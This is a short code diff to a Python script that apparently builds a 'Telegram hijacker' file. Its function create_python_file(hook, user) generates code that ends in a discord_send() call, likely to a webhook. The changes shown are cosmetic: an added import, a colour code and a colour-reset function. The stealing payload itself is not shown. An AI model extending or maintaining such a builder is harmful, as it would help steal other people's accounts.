@@ -1,7 +1,7 @@
 import os
+import sys
 
 def create_python_file(hook, user):
-    # Шаблон кода для нового Python файла
     template = f"""
 import os
 
@@ -52,7 +52,7 @@ discord_send()
 
 def main():
 
-    RED = "\33[91m"
+    RED = "\33[31m"
     logo= f"""
     {RED}
     ▄▄▄█████▓▓█████  ██▓    ▓█████   ▄████  ██▀███  ▄▄▄      ███▄ ▄███▓      ██░ ██  ██▓ ▄▄▄██▀▀▀▄▄▄      ▄████▄   ██ ▄█▀▓█████  ██▀███     
@@ -83,5 +83,10 @@ def main():
     create_python_file(hook, user)
     print("File 'generated_file.py' generated!")
 
+def set_def_color():
+    sys.stdout.write("\033[0m")
+
 if __name__ == "__main__":
     main()
+
+set_def_color()
